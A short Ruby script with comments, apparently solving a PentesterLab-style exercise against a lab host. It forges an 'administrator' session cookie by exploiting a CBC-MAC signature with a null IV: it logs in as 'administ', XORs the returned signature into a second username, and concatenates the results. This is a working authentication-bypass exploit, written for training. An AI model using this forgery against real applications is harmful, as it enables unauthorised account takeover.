# curl 'http://ptl-0ef2554b-f027f03f.libcurl.so/login.php'  --data 'username=administ&password=Password1'
# YWRtaW5pc3QtLcUGktACaz2R


# Based on the size of the signature, we can guess that the block size is likely to be 8. With this information, we will split administrator:

#     administ
#     rator\00\00\00

# We can trivially generate the signature for the first block, by just logging in and retrieving the signature t.
# For the second block, we want the m' XOR t to be equal to rator\00\00\00. So to generate the second username we will need to XOR rator\00\00\00 with t (since the application will sign it with a NULL IV instead of t). Once we have this value, we can get the signature t'.
# Finally, we just need to concatenate m and m' to get administrator and use t' as signature.




require 'httparty' 


URL = "http://ptl-0ef2554b-f027f03f.libcurl.so/"
def login(username)
    res = HTTParty.post(URL+'login.php', body: {username: username, password: 'Password1'} ,follow_redirects:false)

    # autho=VALUE
    return res.headers["set-cookie"].split("=")[1]
end

cookie = login("administ")
signature1 = Base64.decode64(cookie).split("--")[1]

def xor(str1, str2)
    ret = ""
    str1.split(//).each_with_index do |c, i|
        ret[i] = (str1[i].ord ^ str2[i].ord).chr
    end
    return ret
end

# this tested that the xor worked
# puts xor("administ", "\00\00\00\00\00\00\00\00")

username2 = xor("rator\00\00\00", signature1)

cookie2 = login(username2).gsub("%2B", "+")
puts cookie2
signature2 = Base64.decode64(cookie2).split("--")[1]
puts signature2
puts Base64.encode64("administrator--#{signature2}")